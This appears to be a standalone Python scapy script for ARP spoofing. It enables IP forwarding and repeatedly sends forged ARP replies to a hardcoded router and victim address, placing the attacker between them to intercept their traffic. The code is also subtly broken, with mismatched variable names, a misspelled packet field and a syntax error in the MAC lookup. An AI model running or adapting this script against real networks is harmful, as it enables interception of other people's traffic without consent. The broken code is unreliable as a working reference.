#!/usr/bin/python3

import scapy.all as scapy
import argparse
import time

routerIP = "192.168.1.1"
victimIP = "192.168.1.16"

# Enable IPv4 packet forwarding

with open('/proc/sys/net/ipv4/ip_forward', 'w') as handle:
    handle.write('1')
    handle.flush()
handle.close()

def spoof_arp(make_it_look_like_I_it_from_this_ip_IPaddress, targetIP):
    #grab targetIP
    targetlMAC=grab_mac(targetIP)
    #create a response packet
    arp_packet = scapy.ARP(op=2, psrc=make_it_look_like_I_sent_it_from_this_ip_IPaddress, hwdst=targetMAC, pds=targetIP)

    #send the packet
    scapy.send(arp_packet)
    #wait 2 secs
    time.sleep(2)


def grab_mac(targetIP):
    request_packet = scapy.ARP(pdst=targetIP)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_request = broadcast/request_packet

    answered, unanswered = scapy.srp(combined_request, timeout=3)

    return answered[][1].hwsrc

while 1:
    spoof_arp(victimIP, routerIP)
    
    spoof_arp(routerIP, victimIP)


